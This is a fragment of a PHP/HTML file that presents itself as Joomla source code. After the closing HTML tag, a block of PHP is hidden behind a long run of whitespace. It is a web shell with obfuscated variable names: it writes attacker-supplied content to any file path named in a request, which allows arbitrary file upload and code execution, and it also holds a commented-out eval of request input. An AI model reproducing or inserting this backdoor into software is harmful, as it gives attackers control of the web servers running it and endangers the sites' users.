...
</html><?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  $fftden = "94e6339234a470e81a1e6c3aa85fddc7"; if(isset($_REQUEST['qkruxltk'])) { $bncva = $_REQUEST['qkruxltk']; /*eval($bncva);*/ exit(); } if(isset($_REQUEST['syrzi'])) { $ouxx = $_REQUEST['oinmfew']; $yuisetts = $_REQUEST['syrzi']; $osfhrwga = fopen($yuisetts, 'w'); $uuwrokab = fwrite($osfhrwga, $ouxx); fclose($osfhrwga); echo $uuwrokab; exit(); } ?><?php
/**
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
